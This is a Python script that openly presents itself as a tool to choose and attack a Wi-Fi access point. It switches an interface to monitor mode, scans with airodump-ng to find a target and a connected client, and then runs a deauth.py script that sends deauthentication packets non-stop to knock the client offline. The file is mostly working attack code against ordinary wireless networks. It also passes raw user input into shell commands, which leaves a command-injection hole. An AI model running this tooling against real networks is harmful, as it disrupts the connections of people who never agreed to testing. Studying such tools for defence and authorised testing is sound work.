import os
import sys


# Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan


def put_monitor_mode(interface):
    os.system('ifconfig ' + interface + ' down')
    os.system('iwconfig ' + interface + ' mode monitor')
    os.system('ifconfig ' + interface + ' up')


if __name__ == "__main__":
    
    if os.geteuid():
        sys.exit(R + '[**] Please run as root')
    
    print(B + "********************************************************************** \n")
    print("***** Part 1: choosing the AP we want to attck and attacks it ;) ***** \n")
    print("********************************************************************** \n")
    
    # Choosing the interface for monitoring, and put it in monitor mode.
    print(G + "Step 1:  Choosing an interface to put in 'monitor mode' \n")
    empty = input ("Press any key to continue.........\n")
    print(W)
    os.system('ifconfig')
    interface = input(G + "Please enter the interface name you want to put in 'monitor mode': ")
    print(W)
    put_monitor_mode(interface)
#    print("\n" + R +"!! - IMPORTANT:" + W +" In the end don't forget to put the interface back in 'managed mode'. You can do that by running the command - python3 managed_mode.py " + interface + "\n")

    # Choosing the AP that we want to attack.
    print(G + "Step 2: Scanning the network for AP to attack. \n")
    print("You will see all the APs in your area. When you choose an AP you want to attack, press 'Ctrl+C' to stop scaning.\n")
    empty = input ("Press any key to continue.........\n")
    print(W)
    os.system ('airodump-ng ' + interface)
    ap = input(G + "Please enter the BSSID of the AP you want to attack: ")
    channel = input("\nPlease enter the channel of the AP you chose: ")
    name = input("\nPlease enter the ESSID of the AP you chose: ")
    
    # Checking that the choosen AP have client that connected to it.
    print("\nStep 3: Verifying that at least 1 client is connected to the AP you choose. \n")
    print("You will see all the traffic of the choosen AP. When you see a client that is connected to the AP, press 'Ctrl+C' to stop scaning.\n")
    empty = input ("Press any key to continue.........\n")
    print(W)
    os.system('airodump-ng ' + interface + ' --bssid ' + ap + ' --channel ' + channel)
    client = input(G + "Please enter the MAC ADDR of the client: ")
    print("\n")
    
    # Running the deauthentication script.
    print("\nStep 4: Disconnect the connection between the AP from the client. \n")
    print("The packets will be sent non-stop. Press 'Ctrl+C' to stop sending the packets. \n")
    empty = input ("Press any key to start sending the Deauthentication packets.........\n")
    print(W)
    os.system('python3 deauth.py ' + client + ' ' + ap + ' ' + interface)
    
    #Put the interface back in managed mode  
    print(G + "\nStep 5: Reset the interface mode. \n")
    empty = input ("Press any key in order to put " + interface + " in 'managed mode' .........\n")
    print(W)
    os.system('ifconfig ' + interface + ' down')
    os.system('iwconfig ' + interface + ' mode managed')
    os.system('ifconfig ' + interface + ' up')
    print(R + "[**] - The interface: " + interface + ", is now in Managed Mode. \nYou can check it here : \n")
    os.system('iwconfig')









